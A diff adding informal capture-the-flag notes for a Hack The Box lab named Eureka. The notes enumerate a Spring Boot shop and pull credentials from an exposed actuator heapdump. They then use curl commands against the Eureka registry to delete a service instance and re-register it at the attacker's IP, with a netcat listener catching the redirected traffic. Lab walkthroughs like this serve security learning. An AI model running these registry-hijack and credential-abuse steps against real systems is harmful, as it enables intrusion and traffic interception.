@@ -1,0 +1,212 @@
+nmap -sV eureka.htb
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    nginx 1.18.0 (Ubuntu)
+
+web box, go to eureka.htb on firefox
+note that a redirect occurs, sending us to furni.htb, adding that to hosts
+
+no robots.txt at furni.htb/robots.txt
+We can see some templates were used, possible JS abuse????????????????
+
+<!-- /*
+* Bootstrap 5
+* Template Name: Furni
+* Template Author: Untree.co
+* Template URI: https://untree.co/
+* License: https://creativecommons.org/licenses/by/3.0/
+*/ -->
+No JS to be abused immediately, nothing that can be seen rlly.
+Newsletter registration may have sumn?
+
+The 4 main vectors available are:
+- registration page
+- cart, maybe intercept cart request
+- contact form
+- newsletter signup
+
+Cart request is sent upon login, if it did not send when not previously logged in. It is not tied to the user, rather the session over the web.
+
+For purchasing stuff, they reference an order ID?
+When trying to purchase, we need to "validate your billing details and try again." 
+
+--- Falling back to some fuzzing
+feroxbuster -u http://furni.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
+- nothing interesting found here, at least anything that we can access
+ffuf -u http://furni.htb -w /usr/share/seclists/Discovery/DNS/bug-bounty-program-subdomains-trickest-inventory.txt -H "Host:FUZZ.furni.htb" -fs 178
+
+While this is going we load up burp suite to do some "manual enumeration".
+Go to Proxy --> Open Browser --> go to furni.htb --> HTTP history
+
+Now we can see all requests, and what was sent/received. Commonly, look into GET/POST requests, for any malleable queries that can be abused. From here, we just click around and check the HTTP history for anything interesting.
+
+When we register, we see a process_register request. We cannot access the page; returns 405. However, we can investigate this request now w/ burp. 
+- Nothing to note here.
+
+Chroma suggests we try using Intruder to brute force/fuzz the endpoints for adding stuff to cart. We can do so by adding something to our cart, then sending that request to Intruder. From here, we can:
+- Highlight the number after card/add and select Add 5
+- Set the Payload type to Numbers
+- Set form as 0 and to as 1000, leave the step variable
+- Start attack!
+
+Nothing uncovered here but congrats u know how to use intruder and fuzz stuff.
+
+Can't find anything w/ burp against the checkout stuff, still shows to validate info.
+Next vector is newsletter, then contact list.
+
+The contact stuff has nothing. Chroma however did find that he application was running off of Spring Boot, based on the Whitelist error page we kept getting, specifically, when we attempted to go to furni.htb/error, which returned a 999 response, which is non-standard as well.
+
+He sent 2 resources:
+- https://hacktricks.boitatech.com.br/pentesting/pentesting-web/spring-actuators
+- https://blog.1nf1n1ty.team/hacktricks/network-services-pentesting/pentesting-web/spring-actuators
+
+Fun, we can go to http://furni.htb/actuator and get a crazy presentation.
+
+Reading the articles reveals some info:
+- /dump - displays a dump of threads (including a stack trace)
+- /trace - displays the last several HTTP messages (which could include session identifiers)
+- /logfile - outputs the contents of the log file
+- /shutdown - shuts the application down
+- /mappings - shows all of the MVC controller mappings
+- /env - provides access to the configuration environment
+- /restart - restarts the application
+
+Some of these are not available though, as shown by a 404 response code.
+The path for all of these is furni.htb/actuator/{env,trace,etc.}.
+
+Accessing furni.htb/actuator reveals the following:
+
+{"_links":{"self":{"href":"http://furni.htb/actuator","templated":false},"beans":{"href":"http://furni.htb/actuator/beans","templated":false},"caches-cache":{"href":"http://furni.htb/actuator/caches/{cache}","templated":true},"caches":{"href":"http://furni.htb/actuator/caches","templated":false},"health":{"href":"http://furni.htb/actuator/health","templated":false},"health-path":{"href":"http://furni.htb/actuator/health/{*path}","templated":true},"info":{"href":"http://furni.htb/actuator/info","templated":false},"conditions":{"href":"http://furni.htb/actuator/conditions","templated":false},"configprops":{"href":"http://furni.htb/actuator/configprops","templated":false},"configprops-prefix":{"href":"http://furni.htb/actuator/configprops/{prefix}","templated":true},"env-toMatch":{"href":"http://furni.htb/actuator/env/{toMatch}","templated":true},"env":{"href":"http://furni.htb/actuator/env","templated":false},"loggers":{"href":"http://furni.htb/actuator/loggers","templated":false},"loggers-name":{"href":"http://furni.htb/actuator/loggers/{name}","templated":true},"heapdump":{"href":"http://furni.htb/actuator/heapdump","templated":false},"threaddump":{"href":"http://furni.htb/actuator/threaddump","templated":false},"metrics-requiredMetricName":{"href":"http://furni.htb/actuator/metrics/{requiredMetricName}","templated":true},"metrics":{"href":"http://furni.htb/actuator/metrics","templated":false},"sbom":{"href":"http://furni.htb/actuator/sbom","templated":false},"sbom-id":{"href":"http://furni.htb/actuator/sbom/{id}","templated":true},"scheduledtasks":{"href":"http://furni.htb/actuator/scheduledtasks","templated":false},"sessions-sessionId":{"href":"http://furni.htb/actuator/sessions/{sessionId}","templated":true},"sessions":{"href":"http://furni.htb/actuator/sessions","templated":false},"mappings":{"href":"http://furni.htb/actuator/mappings","templated":false},"refresh":{"href":"http://furni.htb/actuator/refresh","templated":false},"features":{"href":"http://furni.htb/actuator/features","templated":false},"serviceregistry":{"href":"http://furni.htb/actuator/serviceregistry","templated":false}}}
+
+Asking grok what we can do w/ this provides the following summary:
+- Check /beans endpoint for config stuff?
+- Check /env, /configprops for potential leaked auth stuff
+- Check /mappings for HTTP request mapping; internal/unknown endpoints really
+- A PoC was sent by chroma too: https://github.com/wdahlenburg/pyhprof
+
+With this PoC, we can run the following to dump some potential artifacts:
+- python3 spring_heapdumper.py -f heapdump
+
+sick none of the stuff works, time to check the endpoint stuff from before:
+- Nothing found immediately in /env
+- /beans is massive and has nothing to give
+- /mappings shows a http://furni.htb/checkout/thankyou endpoint, visiting it in burp reveals nothing
+- /configprops shows nothing
+- /heapdump actually gave us a 76mb memory dump! Running file against it returns 'Java HPROF dump'.
+
+We have a lead, we can use the PoC from before now!
+- sudo /home/kali/venv/bin/python3 spring_heapdumper.py -f heapdump
+
+We uncover the following:
+- a PUT request was sent to /eureka/apps/FURNI/eureka:Furni:8082?status=UP&lastDirtyTimestamp=1722535252684
+	- Authorization: Basic RXVyZWthU3J2cjowc2NhclBXRGlzVGhlQjNzdA==
+	- Appears to have been sent by the webserver itself, based off the Client argument
+- a GET request for /eureka/apps/delta was sent by the server
+	- the auth token thing is the same here
+- Above the last request, we can see an odd string: t@B)@xxLUtlm-*+SsJ
+- We can notice some S3 bucket usage; AWS stuff on the backend?
+- We can see some snapshot JAR archives for "hibernate configs" at /var/www/web/Furni/target/Furni-0.0.1-SNAPSHOT.jar/
+- com.mysql.cj.protocol.a.authentication.AuthenticationKerberosClient????????? Kerberos mentioned
+
+Nothing actionable. Chroma found a blog post for hacking Eureka, which we can assume is being used as a portion of this box's backend/components: https://medium.com/@mfocuz/hacking-netflix-eureka-8e5957b2f539
+
+Some important findings: 
+- Grok says that we can access the Eureka dashboard at furni.htb:8761 to find instances of microservices, which is needed to be exploited here
+	- Upon trying to access this, we are hit w/ a login prompt. Chroma suggested doing CLASSIC strings static analysis against the heapdump, by querying the port; 8761, and searching for any references
+	- We, by a marvelous surprise, are greated with CREDS! http://EurekaSrvr:0scarPWDisTheB3st@localhost:8761/eureka/!
+
+Accessing this reveals the frontend and a few service names:
+- APP-GATEWAY	
+- FURNI
+- USER-MANAGEMENT-SERVICE
+
+Following along w/ Grok, we send a GET request to the Eureka API:
+- curl -u EurekaSrvr:0scarPWDisTheB3st -H "Accept: application/json" http://furni.htb:8761/eureka/apps
+False information, chroma provides better command:
+- curl -u EurekaSrvr:0scarPWDisTheB3st http://furni.htb:8761/eureka/apps/user-management-service, specifically querying this service, though we will test w/ furni too
+	- Nothing to see here except the fact that it is possible, potentially, to edit the ipAddr attribute in the config of these apps to redirect traffic to ourself
+
+Our aim now is to update the returned XML, update port and IP, send it back, then listen on the port and capture the connection made by our following cURL request:
+- curl -u EurekaSrvr:0scarPWDisTheB3st http://furni.htb:8761/eureka/apps/user-management-service > instance.xml
+
+Modify to look like so:
+
+<instance>
+    <instanceId>localhost:USER-MANAGEMENT-SERVICE:8081</instanceId>
+    <hostName>localhost</hostName>
+    <app>USER-MANAGEMENT-SERVICE</app>
+    <ipAddr>10.10.16.9</ipAddr>
+    <status>UP</status>
+    <overriddenstatus>UNKNOWN</overriddenstatus>
+    <port enabled="true">8081</port>
+    <securePort enabled="false">443</securePort>
+    <countryId>1</countryId>
+    <dataCenterInfo class="com.netflix.appinfo.InstanceInfo$DefaultDataCenterInfo">
+      <name>MyOwn</name>
+    </dataCenterInfo>
+    <leaseInfo>
+      <renewalIntervalInSecs>30</renewalIntervalInSecs>
+      <durationInSecs>90</durationInSecs>
+      <registrationTimestamp>1753265042331</registrationTimestamp>
+      <lastRenewalTimestamp>1753323243155</lastRenewalTimestamp>
+      <evictionTimestamp>0</evictionTimestamp>
+      <serviceUpTimestamp>1753265042331</serviceUpTimestamp>
+    </leaseInfo>
+    <metadata>
+      <management.port>8081</management.port>
+    </metadata>
+    <homePageUrl>http://localhost:8081/</homePageUrl>
+    <statusPageUrl>http://localhost:8081/actuator/info</statusPageUrl>
+    <healthCheckUrl>http://localhost:8081/actuator/health</healthCheckUrl>
+    <vipAddress>USER-MANAGEMENT-SERVICE</vipAddress>
+    <secureVipAddress>USER-MANAGEMENT-SERVICE</secureVipAddress>
+    <isCoordinatingDiscoveryServer>false</isCoordinatingDiscoveryServer>
+    <lastUpdatedTimestamp>1753265042331</lastUpdatedTimestamp>
+    <lastDirtyTimestamp>1753265041192</lastDirtyTimestamp>
+    <actionType>ADDED</actionType>
+  </instance>
+
+
+Now modify the xml file to include our own IP (10.10.14.7) and port (4444), then:
+- nc -nvlp 8081
+- curl -su EurekaSrvr:0scarPWDisTheB3st -X DELETE http://furni.htb:8761/eureka/apps/USER-MANAGEMENT-SERVICE/localhost:USER-MANAGEMENT-SERVICE:8081
+- curl -u EurekaSrvr:0scarPWDisTheB3st -H "Content-Type: application/xml" -d @instance.xml -X POST http://furni.htb:8761/eureka/apps/USER-MANAGEMENT-SERVICE, post new xml to server
+
+Works, now force connection back:
+- curl -u EurekaSrvr:0scarPWDisTheB3st http://furni.htb:8761/eureka/apps/USER-MANAGEMENT-SERVICE/localhost:USER-MANAGEMENT-SERVICE:8081
+
+We can see nc hang and return a connection:
+
+GET /actuator/info HTTP/1.1
+Host: 10.10.14.7:9999
+Accept-Language: en-US,en;q=0.9
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://furni.htb:8761/
+Accept-Encoding: gzip, deflate, br
+Connection: keep-alive
+
+We've now confirmed SSRF is possible by creating our own malicious service instance.
+
+curl -X POST http://furni.htb:8761/eureka/apps/USER-MANAGEMENT-SERVICE -H 'Content-Type: application/json' -d '{
+  "instance": {
+    "instanceId": "USER-MANAGEMENT-SERVICE",
+    "hostName": "10.10.16.9",
+    "app": "USER-MANAGEMENT-SERVICE",
+    "ipAddr": "10.10.16.9",
+    "vipAddress": "USER-MANAGEMENT-SERVICE",
+    "secureVipAddress": "USER-MANAGEMENT-SERVICE",
+    "status": "UP",
+    "port": { "$": 8081, "@enabled": "true" },
+    "dataCenterInfo": {
+      "@class": "com.netflix.appinfo.InstanceInfo$DefaultDataCenterInfo",
+      "name": "MyOwn"
+    }
+  }
+}'
+
+---
+
+connect back/lateral movement/dig deeper??????
